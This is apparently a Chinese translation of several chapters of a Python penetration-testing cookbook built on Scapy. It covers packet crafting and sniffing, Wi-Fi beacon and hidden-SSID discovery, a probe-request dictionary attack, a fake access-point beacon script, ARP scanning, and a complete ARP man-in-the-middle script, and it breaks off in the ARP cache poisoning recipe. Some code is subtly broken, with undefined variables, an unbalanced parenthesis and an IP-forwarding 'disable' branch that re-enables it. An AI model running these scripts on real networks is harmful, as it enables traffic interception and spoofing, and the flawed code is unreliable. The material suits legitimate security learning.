# Python 渗透测试秘籍（二）

> 原文：[`annas-archive.org/md5/A471ED08BCFF5C02AB69EE891B13A9E1`](https://annas-archive.org/md5/A471ED08BCFF5C02AB69EE891B13A9E1)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第八章：Scapy 基础知识

在本章中，我们将介绍以下配方：

+   使用 Scapy 创建数据包

+   使用 Scapy 发送和接收数据包

+   分层数据包

+   读取和写入 PCAP 文件

+   嗅探数据包

+   使用 Scapy 创建 ARP 中间人工具

# 介绍

Scapy 是一个强大的 Python 模块，用于数据包操作。它可以解码和创建各种协议的数据包。Scapy 可用于扫描、探测和网络发现任务。

# 使用 Scapy 创建数据包

我们知道，网络通信的基本单元是数据包。因此，我们可以通过使用 Scapy 创建数据包来开始。Scapy 以层的形式创建数据包；每个层都嵌套在其父层内。

# 准备工作

由于我们需要在环境中安装 Scapy 模块，请确保使用`pip`命令安装它：

```py
pip install scapy  
```

安装后，请确保通过在终端中发出`scapy`命令来检查它是否正常工作：

```py
scapy
Welcome to Scapy (3.0.0)
>>>  
```

这将打开一个交互式的 Scapy 终端。您还可以使用它来对 Scapy 脚本进行基本调试。Scapy 支持的所有协议的列表如下：

```py
>>> ls()  
```

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00037.jpeg)

类似地，我们可以按以下方式获取每个协议中的详细信息和参数：

```py
>>> ls(UDP)     
```

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00038.jpeg)

# 如何做...

以下是使用`scapy`模块创建数据包的步骤：

1.  创建一个名为`scapy-packet.py`的新文件，并在编辑器中打开它。

1.  像往常一样，导入`scapy`模块和`pprint`以获得更好的可读性打印：

```py
from scapy.all import *
from pprint import pprint  
```

1.  通过定义 TCP/IP 每个协议层的数据包头并按正确顺序堆叠它们来制作数据包。因此，我们可以通过以下方式创建 TCP 数据包的第一层：

```py
ethernet = Ether()  
```

1.  然后我们可以创建数据包的 IP 层，如下所示：

```py
network = IP(dst='192.168.1.1/30')  
```

由于这是网络层，我们必须将目的地 IP 作为参数传递。Scapy 接受不同的 IP 表示法，如下所示：

+   +   普通的点分十进制表示法：

```py
network = IP(dst='192.168.1.1')  
```

+   +   CIDR 表示法：

```py
network = IP(dst='192.168.1.1/30')  
```

+   +   主机名：

```py
network = IP(dst = 'rejahrehim.com')  
```

此外，我们可以通过将目的地作为列表传递来设置多个目的地：

```py
network = IP(dst = ['rejahrehim.com', '192.168.1.1', '192.168.12'])  
```

1.  类似地，我们可以创建传输层。在我们的情况下，它是一个 TCP 层。我们可以按以下方式创建它：

```py
transport = TCP(dport=53, flags = 'S')  
```

在这里，我们传递目的地端口，并将标志设置为`S`以进行 SYN 数据包。我们还可以将目的地端口作为列表传递以创建多个数据包：

```py
transport = TCP(dport=[(53, 100)], flags = 'S')  
```

1.  接下来，我们可以使用`/`运算符堆叠这些层：

```py
packet = ethernet/network/transport  
```

1.  现在我们可以通过使用`pprint`打印它们来检查生成的数据包：

```py
pprint([pkt for pkt in packet])  
```

我们还可以使用`ls()`来检查数据包：

```py
for pkt in packet:
 ls(pkt)

```

获取数据包详细信息的另一个选项是数据包中的`show()`方法：

```py
for pkt in packet:
 pkt.show()  
```

现在我们可以使用脚本创建一个单个数据包。脚本如下：

```py
from scapy.all import * 
from pprint import pprint 
ethernet = Ether() 
network = IP(dst = ['rejahrehim.com']) 
transport = TCP(dport=[(80)], flags = 'S') 
packet = ethernet/network/transport  
for pkt in packet: 
          pkt.show() 
```

这将创建一个带有 SYN 标志的 TCP/IP 数据包，目的地地址为[`rejahrehim.com/`](https://rejahrehim.com/)，目的地端口为`80`。

1.  现在以`sudo`权限运行脚本：

```py
sudo python3 scapy-packet.py    
```

输出将如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00039.jpeg)

在这里，我们可以看到`scapy`将源 IP 识别为本地 IP，并自动将这些详细信息添加到数据包中。

1.  正如您可能已经注意到的那样，响应的第一行是一个警告消息，说`未找到 IPV6 目标的路由`。我们可以通过使用`logger`模块来避免这些不太重要的消息。为此，在导入 Scapy 之前，导入并将日志级别设置为`ERROR`（仅打印错误消息）。可以通过在脚本顶部添加以下行来实现这一步骤。这一步骤适用于所有使用`scapy`模块的配方：

```py
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  
```

# 使用 Scapy 发送和接收数据包

我们已经在上一篇文章中创建了一些数据包。现在我们可以使用 Scapy 发送和接收这些数据包。

# 如何做...

以下是使用`scapy`模块发送和接收数据包的方法：

1.  确保导入所需的模块：

```py
from scapy.all import *
from pprint import pprint 
```

1.  我们可以使用`send()`函数在第 3 层发送数据包。在这种情况下，Scapy 将处理其内部的路由和第 2 层：

```py
network = IP(dst = '192.168.1.1')
transport = ICMP()
packet = network/transport
send(IP(packet)  
```

这将发送一个 ICMP 数据包

1.  要发送带有自定义第 2 层的数据包，我们必须使用`sendp()`方法。在这里，我们必须传递要用于发送数据包的接口。我们可以使用`iface`参数提供它。如果未提供此参数，它将使用`conf.iface`的默认值：

```py
ethernet = Ether()
network = IP(dst = '192.168.1.1')
transport = ICMP()
packet = ethernet/network/transport
sendp(packet, iface="en0")  
```

1.  要发送一个数据包并接收响应，我们必须使用`sr()`方法：

```py
ethernet = Ether()
network = IP(dst = 'rejahrehim.com')
transport = TCP(dport=80)
packet = ethernet/network/transport
sr(packet, iface="en0")  
```

1.  我们可以使用`sr1()`方法发送一个数据包或一组数据包，并且只记录第一个响应：

```py
sr1(packet, iface="en0")  
```

1.  同样，我们可以使用`srloop()`来循环发送刺激数据包的过程，接收响应并打印它们。

```py
srloop(packet)  
```

# 分层数据包

在 Scapy 中，每个数据包都是嵌套字典的集合，因为 Scapy 使用 Python 字典作为数据包的数据结构。从最底层开始，每个层都将是父层的子字典。此外，数据包中每个层的每个字段都是该层字典中的键值对。因此，我们可以使用赋值操作更改此字段。

# 如何做...

要了解 Scapy 中的分层，可以按照以下步骤进行：

1.  我们可以使用`show()`方法获取数据包及其分层结构的详细信息。我们可以使用交互式终端检查和确定有关每个数据包结构的更多信息。打开终端并输入以下内容：

```py
>>> scapy  
```

接下来，创建一个数据包并显示其详细信息，如下所示：

```py
>>> pkt = Ether()/IP(dst='192.168.1.1')/TCP(dport=80)
>>> pkt.show()  
```

然后它将打印出我们创建的数据包的结构：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00040.jpeg)

即使我们不提供源地址，Scapy 也会自动分配源地址。

1.  我们可以使用`summary()`方法获取数据包的摘要：

```py
>>> pkt.summary()    
```

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00041.jpeg)

1.  我们可以通过列表索引或名称获取数据包的每个层：

```py
>>> pkt[TCP].show()
>>> pkt[2].show()  
```

两者都将打印 TCP 层的详细信息，如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00042.jpeg)

1.  同样，我们可以获取每个层内的每个字段。我们可以获取数据包的目标 IP 地址，如下所示：

```py
>>> pkt[IP].dst   
```

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00043.jpeg)

1.  我们可以使用`haslayer()`方法测试特定层是否存在：

```py
>>> if (pkt.haslayer(TCP)):
....print ("TCP flags code: " + str(pkt.getlayer(TCP).flags)  
```

同样，可以使用`getlayer()`方法获取特定层

1.  我们可以使用 Scapy 的`sniff()`函数嗅探网络，并使用过滤参数从嗅探到的数据包中获取特定类型的数据包：

```py
>>> pkts = sniff(filter="arp",count=10)
>>> print(pkts.summary())  
```

# 读取和写入 pcap 文件

pcap 文件用于保存捕获的数据包以供以后使用。我们可以使用 Scapy 从 pcap 文件中读取数据包并将其写入 pcap 文件。

# 如何做...

我们可以编写一个脚本来使用 Scapy 读取和写入 pcap 文件，如下所示：

1.  我们可以按照以下步骤将 pcap 文件导入到 Scapy 中：

```py
from scapy.all import *
packets = rdpcap("sample.pcap")
packets.summary()  
```

1.  我们可以像处理创建的数据包一样迭代和处理数据包：

```py
for packet in packets:
    if packet.haslayer(UDP):
        print(packet.summary())  
```

1.  我们还可以在导入过程中操纵数据包。如果我们想要更改捕获的 pcap 文件中数据包的目标和源 MAC 地址，我们可以在导入时进行，如下所示：

```py
from scapy.all import *    
packets = []    
def changePacketParameters(packet):
packet[Ether].dst = '00:11:22:dd:bb:aa'
packet[Ether].src = '00:11:22:dd:bb:aa'    
for packet in sniff(offline='sample.pcap', prn=changePacketParameters):
packets.append(packet)   
for packet in packets:
   if packet.haslayer(TCP):
       print(packet.show())  
```

在这里，我们定义一个新函数`changePacketParameters()`，用于迭代每个数据包，并在以太网层内更新其源和目标 MAC 地址。此外，我们将在`sniff()`部分内调用该函数作为`prn`。

1.  我们可以使用`wrpcap()`函数将数据包导出到 pcap 文件：

```py
wrpcap("editted.cap", packets)    
```

1.  我们还可以使用 Scapy 过滤要写入 pcap 文件的数据包：

```py
from scapy.all import *    
packets = []    
def changePacketParameters(packet):
    packet[Ether].dst = '00:11:22:dd:bb:aa'
    packet[Ether].src = '00:11:22:dd:bb:aa'    
def writeToPcapFile(pkt):
    wrpcap('filteredPackets.pcap', pkt, append=True)    
for packet in sniff(offline='sample.pcap', prn=changePacketParameters):
     packets.append(packet)    
for packet in packets:
     if packet.haslayer(TCP):
         writeToPcapFile(packet)
         print(packet.show())  
```

1.  我们可以使用`sendp()`方法重放 pcap 文件中捕获的数据包：

```py
sendp(packets)  
```

我们可以使用一行代码在 Scapy 中读取和重放数据包：

```py
sendp(rdpcap("sample.pcap"))  
```

# 嗅探数据包

Scapy 有一个`sniff()`函数，我们可以用它来从网络中获取数据包。但是 Scapy 内置的`sniff()`函数速度有点慢，可能会跳过一些数据包。当嗅探速度很重要时，最好使用`tcpdump`。

# 如何做...

以下是使用`scapy`模块编写嗅探器的步骤：

1.  创建一个名为`scapy-sniffer.py`的文件并用编辑器打开它。

1.  像往常一样，为脚本导入所需的模块：

```py
import sys
from scapy.all import *  
```

1.  然后，定义所需的变量。这里我们需要定义要嗅探的`interface`：

```py
interface = "en0"
```

您可以使用 Linux 和 macOS 中的`ifconfig`命令获取要使用的`interface`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00044.jpeg)

1.  现在我们可以编写一个函数来处理嗅探到的数据包，这将作为嗅探器的回调函数提供：

```py
def callBackParser(packet):
   if IP in packet:
     source_ip = packet[IP].src
     destination_ip = packet[IP].dst
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
      print("From : " + str(source_ip) + " to -> " + str(destination_ip) + "( " + str(packet.getlayer(DNS).qd.qname) + " )")  
```

在这里，我们获取所有 DNS 数据包的源和目的地 IP，并提取这些 DNS 数据包的域

1.  现在我们可以使用`sniff()`方法开始嗅探并将数据包传递给回调函数：

```py
sniff(iface=interface, prn=callBackParser)    
```

这将开始嗅探来自变量中指定的接口的数据包。

1.  现在我们可以使用`sudo`权限启动脚本：

```py
sudo python3 scapy-sniffer.py    
```

输出将如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00045.jpeg)

1.  我们可以按如下方式打印嗅探到的数据包中的`payload`：

```py
if TCP in packet:
      try:
          if packet[TCP].dport == 80 or packet[TCP].sport == 80:
                print(packet[TCP].payload)
      except:
           pass
```

# 使用 Scapy 进行 ARP 中间人工具

中间人攻击意味着攻击者坐在源和目的地之间，通过攻击系统传递所有数据。这将允许攻击者查看受害者的活动。我们可以借助 Scapy 编写一个小型的 Python 脚本来运行中间人攻击。

# 如何做...

为了更好地理解，我们可以编写一个脚本，按照以下步骤：

1.  创建一个名为`mitm-scapy.py`的新文件，并在编辑器中打开它。

1.  像往常一样，导入所需的模块：

```py
from scapy.all import *
import os
import time
import sys  
```

在这里，我们导入 Scapy 以及所需的`os`、`time`和`sys`模块，这些模块在脚本中是必需的。

1.  现在我们必须为脚本定义变量。我们可以使用 Python 2.x 中的`raw_input`方法或 Python 3.x 中的`input()`来获取变量的详细信息，而不是在脚本中定义它：

```py
interface = "en0"
source_ip = "192.168.1.1"
destination_ip = "192.168.1.33"  
```

1.  由于我们必须获取源和目的地的 MAC 地址以构建 ARP 响应，我们将使用 ARP 请求请求两者，并解析响应以获取 MAC 地址。现在我们必须创建一个函数来获取 MAC 地址：

```py
def getMAC(IP, interface):
answerd, unanswered = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 5, iface=interface, inter = 0.1)    
for send,recieve in answerd:
return recieve.sprintf(r"%Ether.src%")  
```

这将返回调用此函数时提供的 IP 的 MAC 地址

1.  现在我们将创建一个函数来切换 IP 转发。这在 Linux 和 macOS 上是不同的：

+   对于 macOS：

```py
def setIPForwarding(set): 
    if set:
        #for OSX
        os.system('sysctl -w net.inet.ip.forwarding=1')
    else:
        #for OSX
        os.system('sysctl -w net.inet.ip.forwarding=0') 
```

+   +   对于 Linux：

```py
def setIPForwarding(set):
    if set:
        #for Linux
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    else:
        #for Linux
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
```

1.  现在我们必须编写另一个函数来重新建立受害者和源之间的连接。这是为了确保受害者不会发现拦截：

```py
def resetARP(destination_ip, source_ip, interface):
destinationMAC = getMAC(destination_ip, interface)
sourceMAC = getMAC(source_ip, interface)    
send(ARP(op=2, pdst=source_ip, psrc=destination_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=destinationMAC, retry=7))
send(ARP(op=2, pdst=destination_ip, psrc=source_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=sourceMAC, retry=7))
setIPForwarding(False)  
```

在这个函数中，我们首先使用我们编写的`getMAC()`函数获取源和目的地的 MAC 地址。然后，我们将发送请求到源，就好像是来自目的地。此外，我们将发送请求到目的地，就好像是来自源。最后，我们将使用我们编写的`setIPForwarding()`函数重置 IP 转发

1.  现在我们将进行实际攻击。为此，我们将编写一个函数：

```py
def mitm(destination_ip, destinationMAC, source_ip, sourceMAC):
    arp_dest_to_src = ARP(op=2, pdst=destination_ip, psrc=source_ip, hwdst=destinationMAC)
    arp_src_to_dest = ARP(op=2, pdst=source_ip, psrc=destination_ip, hwdst=sourceMAC)
    send(arp_dest_to_src)
    send(arp_src_to_dest)

```

这将把数据包发送到源和目的地，指示我们的接口是源的目的地和目的地的源

1.  接下来，我们必须设置一个回调函数来解析从接口嗅探到的数据包：

```py
def callBackParser(packet):
  if IP in packet:
      source_ip = packet[IP].src
      destination_ip = packet[IP].dst
      print("From : " + str(source_ip) + " to -> " + str(destination_ip))  
```

1.  现在我们将定义`main()`函数来调用攻击：

```py
def main():
      setIPForwarding(True)    
      try:
          destinationMAC = getMAC(destination_ip, interface)
      except Exception as e:
          setIPForwarding(False)
          print(e)
          sys.exit(1)  
      try:
          sourceMAC = getMAC(source_ip, interface)
      except Exception as e:
          setIPForwarding(False)
          print(e)
          sys.exit(1) 
       while True:
          try:
              mitm(destination_ip, destinationMAC, source_ip, sourceMAC)
              sniff(iface=interface, prn=callBackParser,count=10)
           except KeyboardInterrupt:
              resetARP(destination_ip, source_ip, interface)
              break
       sys.exit(1)
   main()  
```

这将创建一个无限循环来设置攻击并嗅探数据包。


# 第九章：Wi-Fi 嗅探

在本章中，我们将涵盖以下内容：

+   寻找 Wi-Fi 设备

+   寻找 SSID

+   揭露隐藏的 SSID

+   对隐藏 SSID 进行字典攻击

+   使用 Scapy 创建虚假访问点

# 介绍

我们已经学会了在 Python 中使用 Scapy 模块。现在我们可以利用 Scapy 模块来嗅探访问点及其 MAC 地址。在此之前，了解 SSID 的概念将会很有用。**服务集标识符**（**SSID**）是无线网络的名称，有助于区分同一网络中的多个信号。我们可以使用 SSID 来识别和连接到网络。

# 寻找 Wi-Fi 设备

加入 Wi-Fi 网络的过程很简单。设备可以监听其他设备以识别它们。这些标识符会持续广播，并被称为**信标**。这些类型的唯一信标由充当访问点的设备广播。这些信标包括作为该访问点名称的 SSID。每个 SSID 都会广播自己独特的信标帧，以通知任何监听设备该 SSID 可用并具有特定功能。我们可以通过监听这些访问点广播的信标来嗅探 Wi-Fi 接口中的数据包，以获取该区域内可用的 Wi-Fi 设备。在这里，我们使用 Scapy 来分析接口捕获的数据包，以提取信标。

# 准备工作

由于我们需要从接口中嗅探数据包，因此我们需要一张能够以监视模式嗅探 Wi-Fi 信号的 Wi-Fi 卡。因此，我们必须确保该卡具备嗅探功能。然后，我们必须将接口设置为监视模式，这对不同的操作系统有不同的设置。由于 Scapy 在 Windows 系统中存在一些限制，因此我们必须在 Linux 或 macOS 环境中运行此操作。

在开始编码之前，我们必须了解 Wi-Fi 数据包。与其他数据包一样，Wi-Fi 数据包也有一定的结构。根据规范 802.11，每个访问点的信标帧包含有关特定 SSID 的大量信息。

以下是 802.11 mgmt 信标帧的帧格式：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00046.jpeg)

通过这个，我们可以了解信标帧的内容。信标帧中真正重要的项目如下：

+   **SSID 名称**: 这是 WLAN 网络的 1-32 个字符的名称，并且在所有信标中都存在。Wireshark 捕获将显示 SSID 标签如下：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00047.jpeg)

+   **BSSID**: 这是 SSID 的唯一的第 2 层 MAC 地址。在 Wireshark 捕获中如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00048.jpeg)

+   **时间戳**: 这代表访问点上的时间。

+   **安全功能**: 此项目指的是访问点的安全功能，如开放、WEP、WPA、WPA2、个人（密码）与企业（带有 RADIUS 服务器的 802.1x）。在 Wireshark 捕获中如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00049.jpeg)

+   **频道**: 这表示此 AP 上的 SSID 操作的特定频率。在 Wireshark 捕获中如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00050.jpeg)

+   **频道宽度**: 这表示频道的宽度，如 20、40、80 和 160 mbps。

+   **国家**: 这提供了所有支持的频道和相应的频道设置列表。每个国家都有自己的监管机构，决定其监管领域内允许的频道或功率级别。此标签定义了操作国家、允许的频道和允许的最大传输限制。

+   **信标间隔**: 这表示 AP 广播此信标帧的频率。在 Wireshark 捕获中如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00051.jpeg)

# 如何做...

在网络接口中启用监视模式。这对不同的操作系统有不同的设置。而且，并非所有的网络卡都支持监视模式。我们必须使用终端命令来执行此操作，因为无法通过 Python 脚本实现。这将把网络卡接口设置为 wlan0 并进入监视模式。

# Linux

按照以下步骤在 Linux 环境中启用监视模式：

1.  这可以通过`airmon-ng`包完成。请确保您安装了`airmon-ng`包。还要确保您提供正确的接口作为参数：

```py
airmon-ng start wlan0  
```

1.  也可以使用以下网络命令完成：

```py
ifconfig wlan0 down
iw dev wlan0 set type monitor
ifconfig wlan0 up  
```

1.  要禁用监视模式，我们可以使用以下命令：

```py
ifconfig wlan0 down
iw dev wlan1 set type managed
ifconfig wlan0 up  
```

# macOS

按照以下步骤在 macOS 环境中启用监视模式：

1.  我们可以使用`airport`实用程序命令在 macOS 中启用监视模式。由于这是库中的二进制命令，我们可以将其`symlink`到`usr/local/bin/`：

```py
sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport

```

现在我们可以使用`airport`选择要嗅探的信道：

```py
airport en0 channel 7  
```

然后我们可以使用以下命令开始嗅探：

```py
sudo airport en0 sniff  
```

这将`sniff`接口`en0`并将其保存到`tmp/`文件夹中的 pcap 文件中，例如：`/tmp/airportSniffXXXXXX.pcap.` 我们可以使用 Scapy 分析此文件。

1.  现在创建一个`wifi-sniff.py`文件并在编辑器中打开它。

1.  像往常一样，加载所需的模块：

```py
from scapy.all import *
```

1.  现在我们可以定义所需的变量。在这里，我们将为接入点创建一个列表：

```py
access_points = []    
```

1.  现在我们可以定义回调函数来解析数据包：

```py
def parsePacket(pkt):
    if pkt.haslayer(Dot11):
        print(pkt.show())  
```

这将打印捕获的 Wi-Fi 数据包。输出如下：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00052.jpeg)

对于 802.11 数据包层，主要变量是：

+   +   `type=0`：这表示帧是管理帧（类型 0）

+   `subtype=8`：这表示管理帧的子类型是信标（类型 8）

+   `addr1`：目标 MAC 地址

+   `addr2`：发送者的源 MAC 地址

+   `addr3`：接入点的 MAC 地址

1.  从前面的细节中，我们可以更新解析器函数以获取 Wi-Fi MAC 地址：

```py
def parsePacket(pkt):
    if pkt.haslayer(Dot11):
        if pkt.type == 0 and pkt.subtype == 8:
            if pkt.addr2 not in ap_list:
               print(pkt.addr2)
```

1.  现在调用`sniff`函数并将数据包传递给`callback`函数：

```py
sniff(iface='en0', prn=parsePacket, count=10, timeout=3, store=0)  
```

1.  保存脚本并以`sudo`权限调用：

```py
$ sudo python3 Wi-Fi-sniff.py  
```

# 查找 SSID

要获取 SSID，我们需要更新先前的方法并从数据包中解析 SSID。

# 如何做...

以下是使用`scapy`模块编写 SSID 嗅探器脚本的步骤：

1.  创建一个`sniff-ssid.py`文件并在编辑器中打开它。

1.  导入所需的模块：

```py
from scapy.all import *   
```

1.  现在创建一个函数来从数据包中解析 SSID：

```py
def parseSSID(pkt):
    if pkt.haslayer(Dot11):
        print(pkt.show())
        if pkt.type == 0 and pkt.subtype == 8:
                ap_list.append(pkt.addr2)
                print("SSID:" + pkt.info)
```

1.  现在运行`sniff`并在回调上调用解析函数。

```py
sniff(iface='en0', prn=ssid, count=10, timeout=3, store=0)  
```

1.  现在以`sudo`权限运行此脚本：

```py
$ sudo python3 sniff-ssid.py  
```

# 暴露隐藏的 SSID

我们可以修改先前的方法以获取隐藏的 SSID。使用 Scapy，我们可以识别探测响应和请求以提取隐藏的 SSID。

# 如何做...

按照以下步骤编写一个暴露隐藏 SSID 的脚本：

1.  创建一个`sniff-hidden-ssid.py`文件并在编辑器中打开它。

1.  导入`scapy`模块并为识别的 SSID 创建一个字典：

```py
from scapy.all import *
hiddenSSIDs = dict()  
```

1.  现在创建一个函数来从数据包中解析隐藏的 SSID：

```py
def parseSSID(pkt):
if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
   if not hiddenSSIDs.has_key(pkt[Dot11].addr3):
         ssid       = pkt[Dot11Elt].info
         bssid      = pkt[Dot11].addr3
         channel    = int( ord(pkt[Dot11Elt:3].info))
         capability = pkt.sprintf("{Dot11Beacon%Dot11Beacon.cap%}\{Dot11ProbeResp:%Dot11ProbeResp.cap%}")
    if re.search("privacy", capability): 
              encrypted = 'Y'
   else: 
              encrypted  = 'N'
    hiddenSSIDs[pkt[Dot11].addr3] =[encrypted, ssid, bssid, channel] 
          print (hiddenSSIDs)  
```

在这里，它检查探测响应和请求以提取 BSSID 和 SSID

1.  最后，`sniff`数据包并将其传递给`callback`函数。

```py
sniff(iface='wlan0', prn=parseSSID, count=10, timeout=3, store=0)    
```

1.  现在以 root 权限运行此脚本：

```py
sudo sniff-hidden-ssid.py    
```

# 隐藏 SSID 的字典攻击

对于隐藏的 SSID，我们可以运行字典攻击来识别隐藏的 SSID。为此，我们将遍历 SSID 列表并发送带有特定 SSID 的广播数据包。如果 SSID 存在，接入点将以数据包响应。因此，我们可以在先前的方法中启动 SSID 嗅探器，并在运行 SSID 的暴力攻击时等待来自接入点的响应。

# 如何做...

以下是编写可用于对 SSID 运行字典攻击的脚本的步骤：

1.  像往常一样，创建一个新的`dictionary-attack-ssid.py`文件并在编辑器中打开它。

1.  加载所有必需的模块，并初始化变量：

```py
from scapy.all import *
senderMac = "aa:aa:aa:aa:aa:aa"
broadcastMac = "ff:ff:ff:ff:ff:ff"  
```

1.  然后，我们遍历列表中的 SSID 并发送带有设置为参数的`RadioTap()`数据包：

```py
for ssid in open('ssidList.txt', 'r').readlines():
     pkt = RadioTap()/Dot11(type = 0, subtype = 4 ,addr1 = broadcastMac, addr2 = senderMac, addr3 = broadcastMac)/Dot11ProbeReq()/Dot11Elt(ID=0, info =ssid.strip()) / Dot11Elt(ID=1, info = "\x02\x04\x0b\x16") / Dot11Elt(ID=3, info="\x08")
     print ("Checking ssid:" + ssid)
     print(pkt.show())
     sendp (pkt, iface ="en0", count=1)
```

1.  现在在一个终端窗口中启动嗅探器脚本并等待响应。

1.  最后，以`sudo`权限启动字典攻击脚本：

```py
sudo python3  dictionary-attack-ssid.py  
```

# 使用 Scapy 创建虚假接入点

我们可以通过使用 Scapy 注入信标帧来创建虚假的 Wi-Fi 接入点。

# 如何做...

让我们尝试用以下步骤创建一个假的 SSID：

1.  创建一个新的`fake-access-point.py`文件并在编辑器中打开它。

1.  加载脚本所需的模块：

```py
from scapy.all import *
import random  
```

在这里，我们使用`scapy`和`random`模块来创建随机的 MAC ID

1.  然后定义接入点名称和要广播的接口：

```py
ssid = "fakeap" 
iface = "en0"  
```

1.  现在我们可以用`beacon`帧来制作数据包：

```py
dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=str(RandMAC()), addr3=str(RandMAC()))
dot11beacon = Dot11Beacon(cap='ESS+privacy')
dot11essid = Dot11Elt(ID='SSID',info=ssid, len=len(ssid))
 rsn = Dot11Elt(ID='RSNinfo', info=(
    '\x01\x00'                 #For RSN Version 1
    '\x00\x0f\xac\x02'         #Group Cipher Suite : 00-0f-ac TKIP
    '\x02\x00'                 #2 Pairwise Cipher Suites (next two lines)
    '\x00\x0f\xac\x04'         #AES Cipher
    '\x00\x0f\xac\x02'         #TKIP Cipher
    '\x01\x00'                 #1 Authentication Key Managment Suite (line below)
    '\x00\x0f\xac\x02'         #Pre-Shared Key
    '\x00\x00'))               #RSN Capabilities (no extra capabilities)   
frame = RadioTap()/dot11/dot11beacon/dot11essid/rsn
```

1.  现在我们可以用`sendp()`方法广播接入点：

```py
sendp(frame, iface=iface, inter=0.0100 if len(frames)<10 else 0, loop=1)  
```

1.  现在以所需的权限运行脚本：

```py
sudo python3 fake-access-point.py  
```

这将广播一个带有提供的 SSID 的接入点


# 第十章：第 2 层攻击

在本章中，我们将介绍以下内容：

+   ARP 监视器

+   ARP 缓存中毒

+   MAC 洪泛

+   VLAN 跳跃

+   通过 VLAN 跳跃进行 ARP 欺骗

+   DHCP 饥饿

# 介绍

第 2 层是数据链路层，负责在具有 MAC 地址的以太网中寻址数据包。第 2 层用于在广域网中的相邻网络节点之间或在同一局域网上的节点之间传输数据。在本章中，我们将介绍 TCP/IP 第二层的一些常见攻击。

# ARP 监视器

通过**地址解析协议**（**ARP**），我们可以找到活动的内部主机。我们可以编写一个使用 Scapy 扫描给定网络中主机的脚本。

# 如何做...

我们可以按照以下步骤编写 ARP 监视器：

1.  创建一个`arp-scanner.py`文件并在编辑器中打开它。

1.  然后我们必须导入所需的模块：

```py
from scapy.all import *
```

1.  现在为脚本声明变量：

```py
interface = "en0"
ip_rage = "192.168.1.1/24"
broadcastMac = "ff:ff:ff:ff:ff:ff"  
```

1.  现在我们可以向 IP 范围内的所有 IP 发送 ARP 数据包，并获取已回答和未回答的数据包。

1.  创建 ARP 数据包如下：

```py
pkt = Ether(dst=broadcastMac)/ARP(pdst = ip_rage)  
```

数据包的结构将如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00053.jpeg)

1.  然后，使用`srp()`发送数据包并接收响应：

```py
answered, unanswered = srp(pkt, timeout =2, iface=interface, inter=0.1)  
```

1.  接下来，遍历所有已回答的数据包并打印它们的 MAC 和 IP 地址：

```py
for send,recive in ans:
print (recive.sprintf(r"%Ether.src% - %ARP.psrc%")) 
```

1.  现在，以所需的权限运行脚本：

```py
sudo python3 arp-scanner.py 
```

这将打印出所提供的网络范围内所有活动系统的 MAC 和 IP。输出将如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00054.jpeg)

1.  现在我们可以将其转换为 ARP 监视器，具有监视网络变化的能力。为此，创建另一个`arp-monitor.py`文件并导入`scapy`模块。

1.  然后，创建一个函数来解析数据包并嗅探接口：

```py
def parsePacket(pkt):
    if ARP in pkt and pkt[ARP].op in (1,2): 
        return pkt.sprintf("%ARP.hwsrc% %ARP.psrc%") 
```

1.  现在开始嗅探并调用`parsePacket()`方法来解析 ARP 数据包：

```py
sniff(prn=parsePacket, filter="arp", store=0)  
```

1.  以所需的权限运行脚本以开始监视：

```py
sudo python3 arp-monitor.py  
```

# ARP 缓存中毒

正如我们所知，TCP/IP 局域网上的系统通过其网络适配器的 MAC 地址识别和相互通信。每个系统都会保留一份系统和其 MAC 地址的列表以供参考，称为 ARP 缓存。如果可能的话，我们需要欺骗一台机器的缓存，使其用错误的 MAC 地址替换另一台机器的 MAC 地址。从机器发送到具有伪造 MAC 地址的机器的所有通信将被定向到连接的机器。因此，ARP 缓存中毒是一种欺骗机器在其 ARP 表中保存有关 IP 地址的错误数据的方法。

# 准备工作

由于我们正在执行一种中间人攻击（从连接到同一网络的另一台设备获取数据），我们必须打开 IP 转发以确保受害者机器上的连接不受影响或中断。为了执行 IP 转发，我们在 Linux 和 macOS 上有不同的方法。

# Linux

我们可以通过检查以下文件中的内容来检查 IP 转发的状态：

```py
cat /proc/sys/net/ipv4/ip_forward  
```

